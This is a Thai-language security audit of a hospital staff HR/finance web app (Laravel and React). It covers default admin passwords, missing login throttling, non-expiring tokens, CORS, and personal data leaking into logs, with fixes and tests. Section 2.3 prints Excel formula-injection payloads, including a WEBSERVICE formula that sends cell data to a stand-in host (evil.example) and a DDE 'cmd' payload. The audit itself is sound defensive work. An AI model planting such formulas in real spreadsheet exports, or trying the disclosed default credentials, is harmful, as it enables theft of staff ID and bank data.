## สรุปผู้บริหาร

พบประเด็น **2 ข้อที่ต้องแก้ทันที** และอีก 6 ข้อระดับกลาง ที่เหลือเป็นข้อปรับปรุง

> **ความคืบหน้า:** ข้อ 1.2, 2.1, 2.2, 2.3, 2.4 แก้แล้วและมีเทสคุ้มครอง เหลือเฉพาะข้อ **1.1 ที่ต้องเปลี่ยนรหัสผ่าน `admin`/`finance` ด้วยตัวเอง** (ดูหัวข้อ "สถานะการแก้ไข")

จุดที่อันตรายที่สุด: **บัญชี `admin` ของระบบยังใช้รหัสผ่านตั้งต้น `password123` อยู่จริง** (ยืนยันแล้วจากฐานข้อมูล) ควบคู่กับ **การที่ `/api/login` ไม่มีระบบจำกัดจำนวนครั้งในการลองรหัสผ่าน** — ใครก็ตามที่เข้าถึงหน้า login ได้ สามารถลองรหัสไม่จำกัดจำนวนครั้ง และรหัสตั้งต้นนี้ก็ประกาศอยู่ในโค้ดที่ track ใน git

ข่าวดีคือ โครงสร้างพื้นฐานหลายอย่างทำถูกต้องแล้ว (ดูหัวข้อ "สิ่งที่ทำได้ดีอยู่แล้ว") โดยเฉพาะเรื่อง mass assignment, SQL injection, และการจัดเก็บไฟล์อัปโหลด

## 1. ระดับวิกฤต (แก้ทันที)

### 1.1 บัญชี `admin` และ `finance` ยังใช้รหัสผ่านตั้งต้น `password123`

**หลักฐาน** — ตรวจจากฐานข้อมูลจริง (`hospital_staff_db`) แบบอ่านอย่างเดียว:

```
admin      admin    -> ยังใช้รหัส default password123
hr         hr       -> เปลี่ยนแล้ว
finance    finance  -> ยังใช้รหัส default password123
```

**ทำไมอันตราย** — `backend/database/seeders/DatabaseSeeder.php` สร้างบัญชี 3 บัญชีไว้ล่วงหน้า โดยกำหนดรหัสผ่านตรง ๆ ว่า `Hash::make('password123')` และไฟล์นี้อยู่ใน git ดังนั้นรหัสผ่านจึงเป็น **ข้อมูลสาธารณะ** ใครที่เคยเห็น repo หรือเอกสารส่งมอบสามารถเข้าบัญชีผู้ดูแลระบบได้ทันที ซึ่งหมายถึงการเข้าถึงข้อมูลบุคลากรทั้งหมด (เลขบัตรประชาชน 13 หลัก เลขบัญชีธนาคาร เงินเดือน) การแก้ข้อมูล และการยืนยันเอกสารการเงิน

**วิธีแก้**

1. เข้าหน้า "โปรไฟล์ของฉัน" → เปลี่ยนรหัสผ่านของ `admin` (และ `finance`) เป็นรหัสที่คาดเดาไม่ได้ อย่างน้อย 16 ตัวอักษร
2. **ก่อนแก้ข้อ 1.2 ต้องทำข้อนี้ก่อน** ไม่งั้นรัน seeder อีกครั้งรหัสจะกลับมาเป็น `password123`

### 1.2 `POST /api/login` ไม่มีการจำกัดจำนวนครั้ง (ไม่มี rate limiting)

**หลักฐาน** — `backend/routes/api.php` บรรทัดที่ 22:

```php
Route::post('/login', [AuthController::class, 'login']);   // ไม่มี middleware throttle
```

และทั้งโปรเจกต์ไม่มี `RateLimiter::for(...)` หรือ middleware `throttle:` อยู่เลย (ตรวจทั้ง `bootstrap/app.php` และ `routes/api.php`)

> ✅ **แก้แล้ว** — รายละเอียดวิธีแก้และวิธีตรวจอยู่ท้ายหัวข้อนี้

**ทำไมอันตราย** — ระบบยืนยันตัวตนด้วย username + password รหัสสั้น (เช่น 8 ตัวอักษรตามนโยบายขั้นต่ำ) และชื่อผู้ใช้ก็เป็นคำที่เดาง่ายมาก (`admin`, `hr`, `finance` อยู่ใน seeder) การไม่มี rate limit ทำให้ brute force ได้ไม่จำกัด และยังเป็นช่องทางทำ DoS ด้วยการยิง bcrypt ซ้ำ ๆ (bcrypt ตั้งไว้ 12 rounds = เปลือง CPU มาก)

**วิธีแก้ (แก้แล้ว)** — เลือกใช้ตัวจำกัดแบบ "นับเฉพาะครั้งที่ล้มเหลว" แทน `throttle:5,1` ธรรมดา เพราะ middleware `throttle` นับทุกคำขอรวมทั้งที่สำเร็จด้วย ซึ่งจะลงโทษผู้ใช้จริงที่เข้า-ออกหลายรอบ

การทำงานใน `AuthController::login()`:

1. ตรวจจำนวนครั้ง **ก่อน** ตรวจรหัสผ่าน — คำขอที่ถูกจำกัดแล้วจะไม่เสีย CPU ไปกับ bcrypt
2. เดารหัสผิด → นับเพิ่มทั้งสองชั้น แล้วตอบ `401`
3. เข้าสำเร็จ → **ล้างตัวนับของบัญชีนั้น** (ไม่ล้างตัวนับต่อ IP เพื่อไม่ให้ผู้โจมตีรีเซ็ตโควตาตัวเองด้วยการล็อกอินบัญชีที่ตัวเองมี)
4. เกินโควตา → `429` พร้อมข้อความไทยและส่วนหัว `Retry-After`

```php
$limits = [
    // กันการเดารหัสของบัญชีใดบัญชีหนึ่ง และไม่ให้ผู้โจมตี
    // ยิงรหัสผิดถล่มจนล็อกบัญชีของคนอื่น (account lockout DoS)
    'login:user:'.$username.'|'.$ip => 5,
    // กันการยิงไล่หลาย username จากเครื่องเดียว
    'login:ip:'.$ip => 30,
];
```

**ทำไมไม่ใช้ `throttle:5,1` เพียว ๆ** — การนับตาม `(username + IP)` และ *ไม่* ล้างตัวนับต่อ IP เมื่อเข้าสำเร็จ เป็นสิ่งที่ middleware ธรรมดาทำไม่ได้ และการตั้งเพดานต่อ IP ต่ำเกินไปจะล็อกทั้งหน่วยงานพร้อมกันเมื่อออกอินเทอร์เน็ตผ่าน NAT เดียวกัน จึงตั้งไว้ 30 ครั้ง/นาที (ปรับได้ที่ `config/security.php`)

**วิธีตรวจ** — `tests/Feature/LoginThrottleTest.php` (5 เทส) ครอบคลุม: ล็อกเมื่อเกินโควตา, ผู้ใช้ที่รหัสถูกไม่ถูกจำกัดแม้เข้า 10 รอบติด, ตัวนับล้างหลังเข้าสำเร็จ, และการโจมตีบัญชีหนึ่งไม่ล็อกเพื่อนร่วมงานที่ใช้ IP เดียวกัน — ทดสอบซ้ำกับ backend จริงที่ใช้ `CACHE_STORE=database` ได้ `429` และข้อความไทยถูกต้อง

## 2. ระดับกลาง

### 2.1 Seeder รีเซ็ตรหัสผ่านกลับเป็นค่าเดิมทุกครั้งที่รัน

`DatabaseSeeder.php` ใช้ `updateOrCreate` พร้อมกำหนด `password` ทุกครั้ง ผลคือ **การรัน `php artisan db:seed` บนเซิร์ฟเวอร์จะรีเซ็ตรหัสของทั้ง 3 บัญชีกลับเป็น `password123`** แม้ผู้ใช้จะเคยเปลี่ยนไปแล้วก็ตาม (นี่คือสาเหตุที่ทำให้ข้อ 1.1 ยังค้างอยู่ — บัญชี `hr` ที่เปลี่ยนรหัสแล้ว อาจถูกทับกลับได้อีก)

**วิธีแก้** — ให้ seeder สร้างเฉพาะตอนที่ยังไม่มีบัญชีนั้น และอ่านรหัสตั้งต้นจาก env

```php
User::firstOrCreate(
    ['username' => 'admin'],
    [
        'name'     => 'Admin System',
        'email'    => 'admin@cmneuro.go.th',
        'password' => Hash::make(env('SEED_ADMIN_PASSWORD', Str::password(24))),
        'role'     => 'admin',
    ]
);
```

### 2.2 Token ของ Sanctum ไม่มีวันหมดอายุ

**หลักฐาน** — `backend/config/sanctum.php`:

```php
'expiration' => null,
```

**ทำไมอันตราย** — token ที่หลุด (เครื่องหาย, log หลุด, screenshot) ใช้ได้ตลอดไป ไม่มีกลไกหมดอายุ และเมื่อผู้ใช้เปลี่ยนรหัสผ่าน token เก่าในอุปกรณ์อื่นก็ **ยังใช้ได้อยู่** (ข้อนี้สำคัญกับระบบที่มีข้อมูลเลขบัตรประชาชน)

**วิธีแก้**

```php
'expiration' => 60 * 12,   // 12 ชั่วโมง
```

เพิ่มตัวเลือก "ออกจากระบบทุกอุปกรณ์" (ลบ token ทั้งหมดของ user) และลบ token อื่นทั้งหมดเมื่อเปลี่ยนรหัสผ่าน

### 2.3 Excel Formula Injection ตอนส่งออกใบเบิก (CWE-1236)

**หลักฐาน** — ยืนยันจากซอร์สของ phpoffice/phpspreadsheet 5.9.0 `Cell/DefaultValueBinder.php` บรรทัดที่ 105:

```php
if (strlen($value) > 1 && $value[0] === '=') {
    return DataType::TYPE_FORMULA;
}
```

`TravelExpenseClaimExporter` เขียนชื่อ-นามสกุลผู้เบิกด้วย `fromArray([...])` ซึ่งผ่าน binder นี้ และเขียนหัวเอกสาร (ชื่อหน่วยงาน) ด้วย `setCellValue()`

**ยืนยันด้วยการรันจริง (PhpSpreadsheet 5.9.0):**

```
ค่าใส่เซลล์                                          ชนิดที่ได้
=WEBSERVICE("http://evil.example/?leak="&A1)          f   ← สูตร (ช่องโหว่จริง)
=HYPERLINK("http://evil.example/?leak="&A1,"click")  f   ← สูตร (ช่องโหว่จริง)
=1+1                                                  f   ← สูตร
=cmd|' /C calc'!A0                                    s   ← ข้อความ (parser ปฏิเสธ)
```

**ข้อควรทราบที่สำคัญ** — payload แบบ DDE ยอดนิยมอย่าง `=cmd|' /C calc'!A0` **ไม่ได้** ทำให้เกิดช่องโหว่ในเคสนี้ เพราะ parser ของ PhpSpreadsheet ปฏิเสธไวยากรณ์นั้น จึงถูกเก็บเป็นข้อความอยู่แล้ว ตัวที่ใช้งานได้จริงคือสูตรที่ถูกไวยากรณ์ โดยเฉพาะ `WEBSERVICE` ซึ่งดึงค่าจากเซลล์อื่นในไฟล์ส่งออกไปยังเซิร์ฟเวอร์ภายนอกได้เมื่อผู้ใช้เปิดไฟล์ (ข้อมูลรั่วโดยไม่ต้องมีการยืนยันกล่องโต้ตอบใด ๆ) และ `HYPERLINK` ที่ใช้ล่อให้คลิก

**ผลกระทบ** — ชื่อ-นามสกุลผู้เบิกถูกกรอกโดยเจ้าหน้าที่การเงินโดยตรง (ไม่มี allow-list) และหัวเอกสารมีฟิลด์ `organization_name` ที่รับข้อความอิสระ จึงป้อนสูตรได้ และไฟล์ที่ส่งออกจะทำงานทันทีเมื่อเปิดบนเครื่องผู้บริหาร/ผู้ตรวจสอบ

**วิธีแก้ (แก้แล้ว)** — บังคับชนิดเซลล์เป็น string สำหรับค่าที่มาจากผู้ใช้ทุกจุด

```php
use PhpOffice\PhpSpreadsheet\Cell\DataType;

$sheet->setCellValueExplicit("B{$row}", $item->first_name, DataType::TYPE_STRING);
```

**วิธีตรวจ** — `tests/Feature/TravelExpenseFormulaInjectionTest.php` สแกนทุกเซลล์ในไฟล์ที่ส่งออกแล้วยืนยันว่าไม่มีเซลล์ใดเป็น `TYPE_FORMULA` พร้อมยืนยันว่าข้อความต้นฉบับไม่ถูกดัดแปลง

### 2.4 Token เก็บใน `localStorage`

`frontend/src/hooks/useAuth.js` เก็บ bearer token ใน `localStorage` ข้อเสียคือ JavaScript ใด ๆ ที่รันบนหน้าเว็บ (ถ้ามี XSS) อ่าน token ได้ทันที

**สถานะปัจจุบัน** — ตรวจแล้ว **ไม่พบช่องโหว่ XSS ในโค้ด**: ไม่มี `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function` เลย และ React escape ค่าให้โดยอัตโนมัติ จึงยังไม่ใช่ช่องโหว่ที่ใช้งานได้ แต่นี่คือความเสี่ยงเชิงโครงสร้างที่ควรลด

**วิธีแก้ (ระยะยาว)** — ย้ายไปใช้ Sanctum SPA mode (cookie `HttpOnly` + `SameSite=Lax` + CSRF token) ซึ่งอ่านจาก JS ไม่ได้ และเพิ่ม security headers (CSP) ที่ `public/.htaccess` หรือ nginx

### 2.5 ข้อมูลส่วนบุคคลรั่วไหลลง log

**หลักฐาน** — `backend/app/Services/ImportService.php` บรรทัดที่ 71:

```php
} catch (\Exception $e) {
    $errorCount++;
    Log::warning('Import row failed', [
        'row' => $row,        // ← ทั้งแถว: citizen_id, bank_account, salary
        'error' => $e->getMessage(),
    ]);
}
```

และ `.env.example` ตั้ง `LOG_LEVEL=debug`

**วิธีแก้** — log เฉพาะ field ที่ไม่ใช่ข้อมูลส่วนบุคคล

```php
Log::warning('Import row failed', [
    'row_number' => $successCount + $errorCount,
    'error' => $e->getMessage(),
]);
```

และตั้ง `LOG_LEVEL=warning` บน production

### 2.6 CORS เปิดกว้างเป็น `*`

ไม่มีไฟล์ `config/cors.php` ในโปรเจกต์ จึงใช้ค่า default ของ Laravel framework:

```php
'paths' => ['api/*', 'sanctum/csrf-cookie'],
'allowed_origins' => ['*'],
'supports_credentials' => false,
```

**ระดับความเสี่ยงจริง: ต่ำ** เพราะใช้ Bearer token ไม่ใช่ cookie — เว็บอื่นไม่สามารถอ่านข้อมูลของผู้ใช้ได้ (browser ไม่แนบ token ให้เอง) แต่การเปิด `*` ยังทำให้เว็บใดก็ได้ยิง `/api/login` แบบ brute force ผ่านเบราว์เซอร์ของผู้ใช้ได้

**วิธีแก้ (แก้แล้ว)** — สร้าง `config/cors.php` ระบุ origin จาก env `CORS_ALLOWED_ORIGINS` (ค่าเริ่มต้น `http://localhost:5173,http://127.0.0.1:5173`) และจำเป็นต้องตั้ง `supports_credentials: true` เพราะการยืนยันตัวตนย้ายไปใช้ cookie (ดูข้อ 2.4) — เบราว์เซอร์ไม่อนุญาตให้ใช้ `*` ร่วมกับ credentials

## 4. สิ่งที่ทำได้ดีอยู่แล้ว (ตรวจแล้วไม่พบปัญหา)

| ประเด็น | ผลการตรวจ |

| **Mass assignment** | `$fillable` ของทุกโมเดลเป็น whitelist ชัดเจน ไม่มีที่ใดใช้ `$request->all()` กับ `create()/fill()` เลย — controller ใช้ `$request->validated()` จาก FormRequest เสมอ |

## 6. ข้อจำกัดของการตรวจครั้งนี้

- **การตรวจรอบแรกเป็นแบบ static** เพราะ PHP บน PATH (8.4.0) ต่ำกว่าที่ `composer.lock` กำหนด (>= 8.4.1) ทำให้ bootstrap ของ Laravel ไม่ทำงาน ภายหลังพบ PHP 8.4.22 ที่ `C:\Users\gkwon\.config\herd\bin\php84\php.exe` จึงรันชุดทดสอบและทดสอบผ่านเบราว์เซอร์ได้จริง
- **ยังไม่ได้ทดสอบว่า seeder รันซ้ำกับฐานข้อมูลจริงแล้วปลอดภัย** — เทสทำบน sqlite in-memory จึงตรวจได้เฉพาะตรรกะ
- **ไม่ได้ตรวจ dependency ฝั่ง PHP** เพราะเครื่องนี้ไม่มี composer
- ไม่ได้ตรวจช่องโหว่ระดับ infrastructure (nginx/Apache, TLS, การตั้งค่า OS) และไม่ได้ตรวจ MariaDB user privileges
- **ไม่ได้แก้ข้อ 1.1** — บัญชี `admin`/`finance` ยังใช้รหัส `password123` อยู่ ต้องเปลี่ยนด้วยตัวเองผ่านหน้า "โปรไฟล์ของฉัน"
- **เทสการจำกัดจำนวนครั้งใช้ `CACHE_STORE=array`** ซึ่งเป็น singleton ในหน่วยความจำ ขณะที่ของจริงใช้ `database` — จึงทดสอบซ้ำกับ backend ที่รันจริง (ยืนยันได้ `429` และข้อความไทยถูกต้อง)
